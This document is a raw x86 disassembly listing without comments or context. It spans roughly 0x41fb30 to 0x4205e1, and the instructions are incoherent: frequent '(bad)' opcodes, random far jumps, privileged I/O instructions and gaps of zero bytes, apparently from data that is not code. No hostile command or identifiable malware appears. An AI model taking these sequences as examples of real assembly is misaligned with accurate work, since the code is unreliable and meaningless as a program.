  41fb30:	stos   BYTE PTR es:[edi],al
  41fb31:	sbb    eax,0x3b63aa4e
  41fb36:	call   0x6d7322a6
  41fb3b:	pop    ecx
  41fb3c:	cmc    
  41fb3d:	sub    edi,DWORD PTR [ecx]
  41fb3f:	push   eax
  41fb40:	std    
  41fb41:	jmp    FWORD PTR [ecx+esi*8]
  41fb44:	or     DWORD PTR [ecx-0x3e],ebx
  41fb47:	sbb    DWORD PTR [ebx],esp
  41fb49:	inc    esi
  41fb4a:	mov    cl,0x6b
  41fb4c:	pop    ebx
  41fb4d:	fild   DWORD PTR [edi+ecx*1+0x1d]
  41fb51:	ret    
  41fb52:	dec    ebp
  41fb53:	shl    bh,1
  41fb55:	dec    esp
  41fb56:	push   ebx
  41fb57:	jne    0x41fb04
  41fb59:	inc    esi
  41fb5a:	and    DWORD PTR [ebx],edx
  41fb5c:	pop    esi
  41fb5d:	xchg   BYTE PTR [esi],dl
  41fb5f:	inc    edx
  41fb60:	mov    edx,0x1c4fb107
  41fb65:	loopne 0x41fb38
  41fb67:	sbb    edi,DWORD PTR [ecx+0x49a44bca]
  41fb6d:	shl    DWORD PTR [ebx+eax*2+0x6e46346b],0x45
  41fb75:	cmp    DWORD PTR [eax],esp
  41fb77:	jns    0x41fba6
  41fb79:	daa    
  41fb7a:	add    eax,0x5c2f221e
  41fb7f:	pop    esp
  41fb80:	jecxz  0x41fb59
  41fb82:	mov    ecx,0x27d15269
  41fb87:	inc    esi
  41fb88:	(bad)
  41fb8b:	push   edi
  41fb8c:	sahf   
  41fb8d:	arpl   WORD PTR [edx],si
  41fb8f:	cs sbb dh,ch
  41fb92:	jne    0x41fb45
  41fb94:	(bad)  
  41fb95:	pushf  
  41fb96:	xor    eax,0x2b62a343
  41fb9b:	jl     0x41fb84
  41fb9d:	dec    ecx
  41fb9e:	sbb    DWORD PTR [edx+0x36a2e062],ebx
  41fba4:	jl     0x41fb31
  41fba6:	pop    ds
  41fba7:	(bad)  
  41fba8:	ja     0x41fb97
  41fbaa:	adc    DWORD PTR [ebx],ebx
  41fbac:	lahf   
  41fbad:	jmp    0x81ab:0x91ebb195
  41fbb4:	lea    edi,[esi-0x8]
  41fbb7:	les    edi,FWORD PTR [ebx+ecx*8]
  41fbba:	xchg   ebx,eax
  41fbbb:	pop    edi
  41fbbc:	dec    ebx
  41fbbd:	leave  
  41fbbe:	(bad)  
  41fbbf:	ret    0x88
	...
  41fc32:	add    BYTE PTR [eax],al
  41fc34:	inc    ecx
  41fc35:	icebp  
  41fc36:	(bad)
  41fc39:	hlt    
  41fc3a:	gs icebp 
  41fc3c:	push   edx
  41fc3d:	sub    eax,0x87128ad2
  41fc42:	inc    esp
  41fc43:	arpl   WORD PTR [eax-0xafffeac],dx
  41fc49:	add    BYTE PTR [eax],al
  41fc4b:	add    BYTE PTR [ecx+0x0],dl
  41fc4e:	inc    esi
  41fc4f:	sub    DWORD PTR [edx-0x5e506bb1],ecx
  41fc55:	fdiv   DWORD PTR [ebx+0x20]
  41fc58:	test   al,0xce
  41fc5a:	fst    QWORD PTR [edx-0x6d]
  41fc5d:	and    BYTE PTR [edi+0x5adf406c],ah
  41fc63:	in     eax,dx
  41fc64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc65:	aaa    
  41fc66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc67:	test   eax,0x5980a3f2
  41fc6c:	cwde   
  41fc6d:	test   DWORD PTR [ecx-0x71],0x5fe9a1ba
  41fc74:	mov    bh,0x79
  41fc76:	push   edx
  41fc77:	jg     0x41fca5
  41fc79:	inc    edx
  41fc7a:	jne    0x41fc2a
  41fc7c:	sbb    BYTE PTR [eax+0x3d193b1f],bl
  41fc82:	mov    dh,0x34
  41fc84:	int3   
  41fc85:	enter  0xcbd1,0x48
  41fc89:	test   eax,0xf576ba04
  41fc8e:	push   ebp
  41fc8f:	add    DWORD PTR [edx],esp
  41fc91:	and    edx,edi
  41fc93:	cmp    dh,0x9f
  41fc96:	jecxz  0x41fc8d
  41fc98:	lea    ecx,[esi+0x60]
  41fc9b:	jbe    0x41fd0a
  41fc9d:	xchg   esi,eax
  41fc9e:	jo     0x41fc64
  41fca0:	sar    esp,cl
  41fca2:	xor    ebp,esp
  41fca4:	loop   0x41fd1d
  41fca6:	and    edi,ebx
  41fca8:	push   ebx
  41fca9:	(bad)  
  41fcaa:	mov    bl,0xce
  41fcac:	jbe    0x41fcfc
  41fcae:	inc    ebx
  41fcaf:	and    al,0x72
  41fcb1:	out    dx,eax
  41fcb2:	inc    eax
  41fcb3:	mov    eax,ds:0xeff30620
  41fcb8:	ret    0xd234
  41fcbb:	push   ss
  41fcbc:	cld    
  41fcbd:	adc    al,0x8a
  41fcbf:	in     al,0x54
  41fcc1:	icebp  
  41fcc2:	dec    ebx
  41fcc3:	dec    edi
  41fcc4:	adc    BYTE PTR [ebp+0x609a34b9],bl
  41fcca:	fidiv  WORD PTR [esi-0x2c4353cc]
  41fcd0:	jmp    0x41fccc
  41fcd2:	or     bl,BYTE PTR [edi*1+0x6aee1632]
  41fcd9:	adc    DWORD PTR [edx],eax
  41fcdb:	pop    esp
  41fcdc:	adc    dh,bl
  41fcde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcdf:	clc    
  41fce0:	mov    BYTE PTR [edi-0x20],al
  41fce3:	and    dh,BYTE PTR ds:0xde2c06fe
  41fce9:	push   edx
  41fcea:	shr    BYTE PTR [ebp+0x260a2b25],0x1d
  41fcf1:	sbb    ch,BYTE PTR [edi+0x5f]
  41fcf4:	fmul   QWORD PTR [edx]
  41fcf6:	mov    cl,al
  41fcf8:	fisubr DWORD PTR [ebx+0x6cf0252e]
  41fcfe:	rcl    edx,1
  41fd00:	aaa    
  41fd01:	or     BYTE PTR [edx+0x4d],cl
  41fd04:	cli    
  41fd05:	sub    bh,cl
  41fd07:	jnp    0x41fd0c
  41fd09:	cli    
  41fd0a:	mov    dh,0x25
  41fd0c:	(bad)  
  41fd0d:	mov    al,ds:0x330677e2
  41fd12:	int    0xa6
  41fd14:	pop    ds
  41fd15:	popa   
  41fd16:	add    BYTE PTR ds:0xdbceb410,dh
  41fd1c:	mov    ebx,0x4d55519b
  41fd21:	dec    ebx
  41fd22:	iret   
  41fd23:	pop    es
  41fd24:	in     eax,0xd0
  41fd26:	add    al,0x1c
  41fd28:	ficomp DWORD PTR [ebp-0x36]
  41fd2b:	ret    0x1fd0
  41fd2e:	sti    
  41fd2f:	push   0xb1e86092
  41fd34:	pop    edx
  41fd35:	and    esp,ecx
  41fd37:	sbb    ah,BYTE PTR [ebp-0x2c]
  41fd3a:	lock dec edx
  41fd3c:	mov    al,0xf4
  41fd3e:	cmp    ebx,DWORD PTR [esi+0x4f]
	...
  41fdb1:	add    BYTE PTR [eax],al
  41fdb3:	add    BYTE PTR ds:0x7b197956,al
  41fdb9:	aas    
  41fdba:	gs pop esi
  41fdbc:	repnz lahf 
  41fdbe:	and    al,0x2d
  41fdc0:	stos   BYTE PTR es:[edi],al
  41fdc1:	pop    ebp
  41fdc2:	nop
  41fdc3:	jne    0x41fd4a
  41fdc5:	push   ebp
  41fdc6:	add    DWORD PTR [eax],eax
  41fdc8:	cmc    
  41fdc9:	add    BYTE PTR [eax],al
  41fdcb:	add    BYTE PTR [ebx-0x79],dh
  41fdce:	dec    DWORD PTR [ecx+0x4b]
  41fdd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdd2:	call   0xd92fa921
  41fdd7:	sub    eax,0x429a141d
  41fddc:	xchg   BYTE PTR [ebx+0x67f210ae],bl
  41fde2:	xchg   esp,edi
  41fde4:	jo     0x41fe46
  41fde6:	pop    ebx
  41fde7:	inc    ebx
  41fde8:	jle    0x41fe60
  41fdea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdeb:	xor    edi,DWORD PTR [edi-0x1b1f3277]
  41fdf1:	push   edx
  41fdf2:	jne    0x41fe11
  41fdf4:	add    eax,0x18280fc3
  41fdf9:	jp     0x41fe72
  41fdfb:	pop    ds
  41fdfc:	sbb    esp,DWORD PTR [ebx-0x6f9e0c67]
  41fe02:	cmp    al,0x69
  41fe04:	cli    
  41fe05:	mov    cs,edi
  41fe07:	ja     0x41fe77
  41fe09:	inc    ebx
  41fe0a:	sub    BYTE PTR [ecx-0x2854a18a],dh
  41fe10:	mov    al,BYTE PTR [ecx+esi*4]
  41fe13:	cmp    ebx,0xffffff9e
  41fe16:	pusha  
  41fe17:	stos   BYTE PTR es:[edi],al
  41fe18:	scas   al,BYTE PTR es:[edi]
  41fe19:	jp     0x41fe4c
  41fe1b:	or     DWORD PTR [ecx+0x5c206d80],ecx
  41fe21:	pusha  
  41fe22:	rcr    BYTE PTR [ecx+0x4db7619c],1
  41fe28:	xchg   esi,eax
  41fe29:	jae    0x41fe88
  41fe2b:	mov    edx,0x1ae7adf3
  41fe30:	add    ebp,DWORD PTR [ecx-0x78]
  41fe33:	or     DWORD PTR [esi+0x32],0xac9a402b
  41fe3a:	stc    
  41fe3b:	mov    ebx,0x2e171ca2
  41fe40:	add    DWORD PTR [esi+eax*1-0x396cc696],ecx
  41fe47:	dec    ebp
  41fe48:	loopne 0x41fe74
  41fe4a:	xchg   esp,eax
  41fe4b:	add    BYTE PTR ds:0xfd5c344c,al
  41fe51:	rcr    DWORD PTR [edi-0x19512678],0x52
  41fe58:	(bad)  
  41fe59:	inc    ebp
  41fe5a:	pop    ss
  41fe5b:	inc    ebp
  41fe5c:	in     eax,0xc8
  41fe5e:	cmp    eax,0xf9904f6b
  41fe63:	in     al,dx
  41fe64:	pop    esi
  41fe65:	sahf   
  41fe66:	push   esp
  41fe67:	repnz push esp
  41fe69:	jle    0x41fe33
  41fe6b:	outs   dx,DWORD PTR ds:[esi]
  41fe6c:	xchg   bl,dl
  41fe6e:	xchg   ebp,eax
  41fe6f:	mov    edx,0x66dcd788
  41fe74:	loop   0x41fe52
  41fe76:	mov    eax,DWORD PTR [edx-0x43]
  41fe79:	inc    esp
  41fe7a:	xor    ebx,ebp
  41fe7c:	mov    ecx,0xe16fc120
  41fe81:	ins    BYTE PTR es:[edi],dx
  41fe82:	xor    eax,0x7d53e07d
  41fe87:	add    eax,0xa951629f
  41fe8c:	aam    0xdf
  41fe8e:	adc    edi,DWORD PTR [edi+0x32]
  41fe91:	mov    cl,0xea
  41fe93:	and    BYTE PTR [ebx+0x6c0ce6f1],ch
  41fe99:	scas   al,BYTE PTR es:[edi]
  41fe9a:	fs repz in eax,0xc1
  41fe9e:	ss hlt 
  41fea0:	mov    ecx,0x25222a92
  41fea5:	loop   0x41fee4
  41fea7:	(bad)  
  41fea8:	adc    al,0x6a
  41feaa:	out    dx,al
  41feab:	ja     0x41fee2
  41fead:	push   cs
  41feae:	mov    dh,0xa3
  41feb0:	test   DWORD PTR ds:0xf1aa4b3f,edi
  41feb6:	push   edi
  41feb7:	test   al,0x9a
  41feb9:	and    al,dl
  41febb:	(bad)  
  41febd:	cmp    al,0xb7
  41febf:	hlt    
  41fec0:	scas   al,BYTE PTR es:[edi]
	...
  41ff31:	add    BYTE PTR [eax],al
  41ff33:	add    BYTE PTR [ecx-0xda40a3],bh
  41ff39:	out    0xbb,eax
  41ff3b:	fisttp QWORD PTR [edi+0x7]
  41ff3e:	mov    WORD PTR [edi+0x31d5d27],?
  41ff44:	jp     0x41ff9c
  41ff46:	add    DWORD PTR [eax],eax
  41ff48:	cmc    
  41ff49:	add    BYTE PTR [eax],al
  41ff4b:	add    BYTE PTR [ebx-0x75c59a32],dl
  41ff51:	cwde   
  41ff52:	push   ds
  41ff53:	pop    ebp
  41ff54:	mov    dh,0xfd
  41ff56:	pop    edx
  41ff57:	lea    ebp,[eax]
  41ff59:	xchg   ebp,ebx
  41ff5b:	cdq    
  41ff5c:	jmp    0xa3a:0x6360fd64
  41ff63:	inc    edx
  41ff64:	xor    edx,DWORD PTR [ecx]
  41ff66:	(bad)  
  41ff67:	nop
  41ff68:	dec    esp
  41ff69:	adc    dh,BYTE PTR [edi+0x3bec2609]
  41ff6f:	jmp    0x321cfc4
  41ff74:	pop    ss
  41ff75:	mov    eax,0x25582ee5
  41ff7a:	mov    ch,bl
  41ff7c:	mov    esp,0x3556781c
  41ff81:	xchg   esp,eax
  41ff82:	jns    0x41ff18
  41ff84:	fisub  WORD PTR [edi-0x6ac4445d]
  41ff8a:	inc    ebx
  41ff8b:	into   
  41ff8c:	int    0xc4
  41ff8e:	arpl   WORD PTR [edx+0x62],sp
  41ff91:	sbb    bl,BYTE PTR [edx-0x56fa62f6]
  41ff97:	mov    edx,0x3aaeb220
  41ff9c:	mov    DWORD PTR [eax-0x5a3fe1aa],edx
  41ffa2:	(bad)  
  41ffa3:	(bad)  
  41ffa4:	daa    
  41ffa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffa6:	xor    DWORD PTR [edx+0x3bac2e14],ecx
  41ffac:	fdivr  st,st(1)
  41ffae:	ror    DWORD PTR [ecx-0x3afde25d],0x8a
  41ffb5:	push   0xe6abf51a
  41ffba:	xchg   esi,eax
  41ffbb:	hlt    
  41ffbc:	sub    eax,0x9189103a
  41ffc1:	sti    
  41ffc2:	mov    bl,BYTE PTR [edi+0x18]
  41ffc5:	les    ecx,FWORD PTR [ebp+0x1b]
  41ffc8:	push   edx
  41ffc9:	inc    ebx
  41ffca:	aad    0x23
  41ffcc:	xor    BYTE PTR ds:0x2acad01b,0xe7
  41ffd3:	adc    al,0xcf
  41ffd5:	inc    ebx
  41ffd6:	test   ebx,ecx
  41ffd8:	jae    0x420015
  41ffda:	or     BYTE PTR [ecx+0xa807086],cl
  41ffe0:	inc    edi
  41ffe1:	in     al,dx
  41ffe2:	push   0x1ab4c2c0
  41ffe7:	xlat   BYTE PTR ds:[ebx]
  41ffe8:	sbb    al,0x9
  41ffea:	loopne 0x41ff6d
  41ffec:	sub    eax,0x71845a70
  41fff1:	xchg   al,ch
  41fff3:	les    ecx,FWORD PTR [esi]
  41fff5:	jl     0x420046
  41fff7:	pusha  
  41fff8:	sbb    eax,0x26564a9f
  41fffd:	nop
  41fffe:	cmp    eax,DWORD PTR ds:0xff85ddbd
  420004:	xor    DWORD PTR [edi+0xb],esi
  420007:	ret    
  420008:	shl    DWORD PTR [ecx+0x69fae566],0xc7
  42000f:	mov    bh,0x27
  420011:	cs aam 0x50
  420014:	push   ss
  420015:	loope  0x41ffb6
  420017:	jecxz  0x42002b
  420019:	sahf   
  42001a:	sbb    edi,edx
  42001c:	addr16 mov esi,0x34435ff3
  420022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420023:	js     0x41ffb2
  420025:	hlt    
  420026:	xchg   ecx,eax
  420027:	mov    cs,WORD PTR [ebx+edx*1-0xd]
  42002b:	sub    eax,0xe3ccaced
  420030:	xor    edi,edx
  420032:	fucomp st(1)
  420034:	pushf  
  420035:	jge    0x42009a
  420037:	pop    ds
  420038:	xor    DWORD PTR [eiz*1+0x78966347],ebp
  42003f:	mov    dh,0xcd
	...
  4200b1:	add    BYTE PTR [eax],al
  4200b3:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  4200b9:	mov    ebx,0xe891ffdf
  4200be:	arpl   WORD PTR [eax-0x11cd8667],ax
  4200c4:	outs   dx,DWORD PTR ds:[esi]
  4200c5:	push   edi
  4200c6:	add    DWORD PTR [eax],eax
  4200c8:	cmc    
  4200c9:	add    BYTE PTR [eax],al
  4200cb:	add    BYTE PTR [edi-0x59],dl
  4200ce:	fdivr  QWORD PTR [eax-0x1c783430]
  4200d4:	cmp    esp,DWORD PTR [edx-0x53]
  4200d7:	mov    dh,0x1c
  4200d9:	std    
  4200da:	scas   eax,DWORD PTR es:[edi]
  4200db:	aam    0x41
  4200dd:	test   eax,0x89fd7d2
  4200e2:	inc    esi
  4200e3:	push   ss
  4200e4:	jg     0x42011e
  4200e6:	out    dx,al
  4200e7:	adc    BYTE PTR [ebx-0x34],cl
  4200ea:	xchg   ecx,eax
  4200eb:	daa    
  4200ec:	ror    DWORD PTR [edi-0x48],0x78
  4200f0:	rol    edx,1
  4200f2:	cmp    DWORD PTR ds:0x4fbf4e1b,esi
  4200f8:	rcl    ecx,1
  4200fa:	shl    DWORD PTR [edi],1
  4200fc:	loope  0x42010f
  4200fe:	js     0x4200d1
  420100:	adc    al,BYTE PTR [ecx-0x4cacd416]
  420106:	ds aad 0x92
  420109:	adc    eax,0xd6e8cf56
  42010e:	jecxz  0x420159
  420110:	lods   al,BYTE PTR ds:[esi]
  420111:	ja     0x6dd27ef2
  420117:	xchg   ebx,eax
  420118:	int    0x63
  42011a:	sbb    ah,BYTE PTR fs:[ebp+0x79]
  42011e:	add    al,0x8c
  420120:	out    dx,al
  420121:	pushf  
  420122:	push   ecx
  420123:	push   es
  420124:	call   esp
  420126:	adc    edx,esp
  420128:	fld    QWORD PTR [ebp+0x48]
  42012b:	jne    0x4200f0
  42012d:	xor    edi,edi
  42012f:	cmp    dh,dh
  420131:	stos   BYTE PTR es:[edi],al
  420132:	icebp  
  420133:	and    bh,al
  420135:	dec    esi
  420136:	mov    eax,ds:0xff126886
  42013b:	sbb    al,0xa9
  42013d:	mov    ds:0x8ae1f015,al
  420142:	cmp    bh,BYTE PTR [ecx-0x34a6236]
  420148:	enter  0xcf9a,0xbd
  42014c:	pop    edi
  42014d:	loope  0x42016d
  42014f:	call   0x939a:0x46b8c287
  420156:	fld    QWORD PTR ds:0x98408a72
  42015c:	test   DWORD PTR [ebx+0x69],edx
  42015f:	sub    eax,0x18d1a866
  420164:	test   al,0x5a
  420166:	cmp    BYTE PTR [ebx-0x180ed7ba],ah
  42016c:	std    
  42016d:	pop    edx
  42016e:	jge    0x420148
  420170:	dec    esp
  420171:	add    al,0x67
  420173:	jo     0x4201d7
  420175:	scas   eax,DWORD PTR es:[edi]
  420176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420177:	inc    ebp
  420178:	push   0xba1ea7ec
  42017d:	fisttp WORD PTR [ecx]
  42017f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420180:	fcomp  QWORD PTR [esi+ebp*4-0x3b840110]
  420187:	ins    BYTE PTR es:[edi],dx
  420188:	sti    
  420189:	retf   
  42018a:	add    ebp,DWORD PTR [ecx-0x7e]
  42018d:	and    ebx,DWORD PTR [ebp-0x51]
  420190:	mov    ah,0xf0
  420192:	mov    ?,WORD PTR [ebp+0x68]
  420195:	mov    WORD PTR [ebx-0x27],ss
  420198:	ds pushf 
  42019a:	push   eax
  42019b:	or     DWORD PTR [ebx],edx
  42019d:	test   DWORD PTR [esi+0x12],esp
  4201a0:	dec    esi
  4201a1:	jo     0x420170
  4201a3:	add    ch,0x54
  4201a6:	sbb    BYTE PTR [ebx],bh
  4201a8:	test   dh,al
  4201aa:	stos   DWORD PTR es:[edi],eax
  4201ab:	cmp    BYTE PTR [ecx-0x7c8f3f6],bh
  4201b1:	inc    ebp
  4201b2:	call   0x1676:0xcae9e64c
  4201b9:	neg    ebp
  4201bb:	pop    esi
  4201bc:	pusha  
  4201bd:	push   esi
  4201be:	into   
  4201bf:	push   ebp
  4201c0:	cmp    al,0x0
	...
  420232:	add    BYTE PTR [eax],al
  420234:	push   ecx
  420235:	sbb    edi,edi
  420237:	jmp    si
  42023a:	fnstcw WORD PTR [edi]
  42023c:	mov    DWORD PTR ds:0x85f4d010,ebx
  420242:	aad    0xee
  420244:	fs pop eax
  420246:	add    DWORD PTR [eax],eax
  420248:	cmc    
  420249:	add    BYTE PTR [eax],al
  42024b:	add    BYTE PTR [ebp+0x326620fa],cl
  420251:	retf   0xbd0a
  420254:	repnz xor DWORD PTR [ebp-0x62],0xd1ce8d7a
  42025c:	aas    
  42025d:	(bad)  [edx]
  42025f:	int3   
  420260:	int    0x84
  420262:	jg     0x420209
  420264:	sbb    al,0xe2
  420266:	cmp    al,BYTE PTR [ebx+0x6b]
  420269:	sub    BYTE PTR [ebx+0x3c],dh
  42026c:	je     0x420265
  42026e:	(bad)  
  42026f:	cs jns 0x420275
  420272:	adc    eax,0xb627e255
  420277:	xchg   edx,eax
  420278:	mov    bl,0x2b
  42027a:	xor    esp,DWORD PTR [esi-0x1e30eab0]
  420280:	sahf   
  420281:	rcl    DWORD PTR [edx-0x61284f7e],cl
  420287:	cli    
  420288:	mov    al,ds:0x6c51a41c
  42028d:	pusha  
  42028e:	cmp    ebp,DWORD PTR [ebx]
  420290:	shr    DWORD PTR [eax-0x19],1
  420293:	jbe    0x4202c6
  420295:	jo     0x420249
  420297:	jge    0x4202ea
  420299:	std    
  42029a:	imul   eax,DWORD PTR ds:0xd0355c36,0x7a903b45
  4202a4:	xchg   ecx,eax
  4202a5:	sub    al,0x44
  4202a7:	cmc    
  4202a8:	xor    al,0x21
  4202aa:	call   0xf8e:0x121643ff
  4202b1:	sub    DWORD PTR [esp+edi*8-0x3b],esp
  4202b5:	jmp    0x25ce:0x368bc256
  4202bc:	fwait
  4202bd:	mov    al,0x3a
  4202bf:	jmp    0x62600bd5
  4202c4:	adc    DWORD PTR [ebp+eiz*1+0x4c],0x85321df
  4202cc:	scas   al,BYTE PTR es:[edi]
  4202cd:	ins    BYTE PTR es:[edi],dx
  4202ce:	add    DWORD PTR [ecx+0x26],edx
  4202d1:	and    ch,dl
  4202d3:	mov    ebp,0xaeae73f2
  4202d8:	rcr    DWORD PTR [eax],1
  4202da:	sbb    ebx,DWORD PTR [ecx+0x3a]
  4202dd:	ror    DWORD PTR [edi],1
  4202df:	mov    ds:0xbdad17c9,al
  4202e4:	dec    eax
  4202e5:	(bad)  
  4202e6:	into   
  4202e7:	inc    ebp
  4202e8:	mov    ecx,0x7e5bb056
  4202ed:	aad    0x47
  4202ef:	icebp  
  4202f0:	cli    
  4202f1:	jmp    0x337e:0xbbf0450b
  4202f8:	dec    esi
  4202f9:	sub    DWORD PTR [esi-0x3e],esp
  4202fc:	sub    ebp,DWORD PTR [ebx]
  4202fe:	push   esi
  4202ff:	mov    ch,0x8f
  420301:	sub    ebp,0x60
  420304:	clc    
  420305:	or     BYTE PTR [esp+edx*1+0x1bf1cf12],al
  42030c:	fisub  WORD PTR [edx+0x129dccf0]
  420312:	xor    al,0xf6
  420314:	add    al,0x9
  420316:	sbb    eax,0xc0e34545
  42031b:	jae    0x420371
  42031d:	push   0xea5ac486
  420322:	sbb    eax,0x91b81caa
  420327:	xchg   DWORD PTR [esi*4-0x7920ab01],eax
  42032e:	test   esi,esi
  420330:	or     BYTE PTR [edi+0x23cd3262],bl
  420336:	fst    DWORD PTR [esi]
  420338:	adc    al,0x7b
  42033a:	and    dl,0x4
  42033d:	mov    esi,0x17574a
	...
  4203b2:	add    BYTE PTR [eax],al
  4203b4:	cmp    al,0xe7
  4203b6:	imul   ebp,edi,0xfffffffb
  4203b9:	out    dx,eax
  4203ba:	mov    esp,0x889a5af7
  4203bf:	arpl   WORD PTR [edi+ecx*4],cx
  4203c2:	jp     0x4203eb
  4203c4:	pop    ecx
  4203c5:	pop    ecx
  4203c6:	add    DWORD PTR [eax],eax
  4203c8:	cmc    
  4203c9:	add    BYTE PTR [eax],al
  4203cb:	add    BYTE PTR ds:0xb1a933c8,dl
  4203d1:	aas    
  4203d2:	loope  0x420433
  4203d4:	xchg   ecx,eax
  4203d5:	push   ss
  4203d6:	jecxz  0x42039a
  4203d8:	xlat   BYTE PTR ds:[ebx]
  4203d9:	mov    ecx,DWORD PTR [eax]
  4203db:	test   eax,0xb0b487b4
  4203e0:	push   es
  4203e1:	cmp    esp,DWORD PTR [ebp-0x5ef246d8]
  4203e7:	popf   
  4203e8:	push   ecx
  4203e9:	mov    ch,bh
  4203eb:	add    DWORD PTR [edi+ecx*2],edi
  4203ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203ef:	call   0x55dba582
  4203f4:	mov    ch,0xbf
  4203f6:	or     al,dh
  4203f8:	mov    bh,0x50
  4203fa:	push   eax
  4203fb:	sbb    cl,bl
  4203fd:	out    dx,al
  4203fe:	mov    bl,0x1b
  420400:	or     dh,BYTE PTR [si-0x66]
  420404:	inc    eax
  420405:	dec    ecx
  420406:	dec    esi
  420407:	jmp    0xfd09ca8
  42040c:	cmp    al,0xd6
  42040e:	les    ax,DWORD PTR [edi+0x735fdef8]
  420415:	lods   eax,DWORD PTR cs:[esi]
  420417:	sahf   
  420418:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420419:	jecxz  0x420470
  42041b:	lock push ss
  42041d:	and    ecx,eax
  42041f:	fs ret 0xe337
  420423:	sbb    BYTE PTR [esi+0x1a],cl
  420426:	or     ecx,DWORD PTR [edi+0x17]
  420429:	inc    esi
  42042a:	fstp   TBYTE PTR [edx+0xa]
  42042d:	jb     0x420479
  42042f:	pop    es
  420430:	lods   eax,DWORD PTR ds:[esi]
  420431:	add    eax,0x770904d0
  420436:	mov    ebx,0x61c784f7
  42043b:	popf   
  42043c:	sar    BYTE PTR [ebp+0x31b92c1],1
  420442:	loop   0x420497
  420444:	xor    BYTE PTR [eax],ch
  420446:	push   ecx
  420447:	xchg   ecx,eax
  420448:	mov    dl,dl
  42044a:	lods   al,BYTE PTR ds:[esi]
  42044b:	mov    cl,0xea
  42044d:	and    eax,0xa07af919
  420452:	loope  0x4204aa
  420454:	jmp    0x1df2:0x452a35be
  42045b:	pop    ebp
  42045c:	mov    dh,dh
  42045e:	jo     0x4204dc
  420460:	sub    al,ah
  420462:	gs xchg edi,eax
  420464:	daa    
  420465:	test   BYTE PTR [eax-0x3a006a68],cl
  42046b:	(bad)  
  42046c:	pop    esp
  42046d:	adc    DWORD PTR [esp+eax*1+0x50],eax
  420471:	mov    ch,0x3c
  420473:	outs   dx,BYTE PTR ds:[esi]
  420474:	int    0x81
  420476:	lea    ecx,fs:[edi+0x2a]
  42047a:	push   edi
  42047b:	stos   DWORD PTR es:[edi],eax
  42047c:	test   eax,0x6cf1b542
  420481:	xchg   esp,eax
  420482:	or     BYTE PTR [edx+0x34472fb0],ah
  420488:	rcl    BYTE PTR [ebx+eax*2],cl
  42048b:	in     eax,dx
  42048c:	xchg   ebx,eax
  42048d:	shl    al,cl
  42048f:	stos   DWORD PTR es:[edi],eax
  420490:	or     eax,0x1392927
  420495:	out    dx,eax
  420496:	sbb    al,0xa5
  420498:	sar    DWORD PTR [ecx+0x4e],1
  42049b:	and    ch,ah
  42049d:	sbb    al,BYTE PTR [ebp+0x41373c19]
  4204a3:	adc    eax,esp
  4204a5:	jmp    0x5219:0x905bf622
  4204ac:	out    dx,eax
  4204ad:	mov    eax,ds:0x5693c687
  4204b2:	mov    dh,0x3b
  4204b4:	je     0x42046a
  4204b6:	push   es
  4204b7:	and    ah,BYTE PTR [edi+0x2eaf210b]
  4204bd:	push   ebx
  4204be:	(bad)  
  4204bf:	ins    BYTE PTR es:[edi],dx
  4204c0:	stc    
	...
  420531:	add    BYTE PTR [eax],al
  420533:	add    BYTE PTR [eax+0x34],bh
  420536:	add    bh,bl
  420538:	dec    esi
  420539:	(bad)  
  42053a:	stc    
  42053b:	mov    bh,0x14
  42053d:	clc    
  42053e:	add    al,0xe1
  420540:	loopne 0x42055b
  420542:	add    eax,0x15a4e68
  420547:	add    ch,dh
  420549:	add    BYTE PTR [eax],al
  42054b:	add    BYTE PTR [eax+0x196aad73],dh
  420551:	cdq    
  420552:	nop
  420553:	mov    ebx,0xaa2fdfd9
  420558:	imul   ebx,DWORD PTR [edx+0x1d3d2053],0xffffffb8
  42055f:	les    edi,FWORD PTR [edi+edx*4-0x3f88ffc2]
  420566:	daa    
  420567:	jecxz  0x420523
  420569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42056a:	add    eax,0xd8553aa8
  42056f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420570:	sub    BYTE PTR [ebp-0x2d],bh
  420573:	xor    DWORD PTR [eax],esp
  420575:	mov    al,0xeb
  420577:	jmp    0xa743a123
  42057c:	outs   dx,BYTE PTR gs:[esi]
  42057e:	add    eax,0x301ddae3
  420583:	fwait
  420584:	leave  
  420585:	popf   
  420586:	ret    
  420587:	psrlq  mm4,QWORD PTR [ebp-0x5c]
  42058b:	pop    ecx
  42058c:	iret   
  42058d:	mov    WORD PTR [ebp+0x41],fs
  420590:	lods   eax,DWORD PTR ds:[esi]
  420591:	cwde   
  420592:	int3   
  420593:	test   al,0xc
  420595:	icebp  
  420596:	mov    dl,0xf3
  420598:	fsubrp st(7),st
  42059a:	inc    eax
  42059b:	in     al,0x15
  42059d:	scas   eax,DWORD PTR es:[edi]
  42059e:	mov    esp,0x6342a304
  4205a3:	scas   al,BYTE PTR es:[edi]
  4205a4:	imul   edx,DWORD PTR [ebx+0x76],0x1e
  4205a8:	adc    cl,ch
  4205aa:	xchg   esp,eax
  4205ab:	cmp    edi,DWORD PTR ds:0x1951aaa0
  4205b1:	dec    ecx
  4205b2:	jnp    0x4205a5
  4205b4:	xchg   esp,eax
  4205b5:	ficom  DWORD PTR [esi-0x24]
  4205b8:	inc    esi
  4205b9:	lahf   
  4205ba:	sbb    bl,ch
  4205bc:	and    cl,dl
  4205be:	pop    eax
  4205bf:	neg    DWORD PTR [esi-0x751b381c]
  4205c5:	(bad)  
  4205c6:	sub    cl,al
  4205c8:	or     bh,BYTE PTR [esi+0x74]
  4205cb:	retf   
  4205cc:	mov    ?,WORD PTR [edx-0x17df3010]
  4205d2:	sbb    DWORD PTR [eax-0x22d46b76],0xffffffbb
  4205d9:	ret    0x4b6b
  4205dc:	or     al,0xc
  4205de:	sbb    DWORD PTR [ebx+0x60],esp
  4205e1:	mov    ah,0x5c
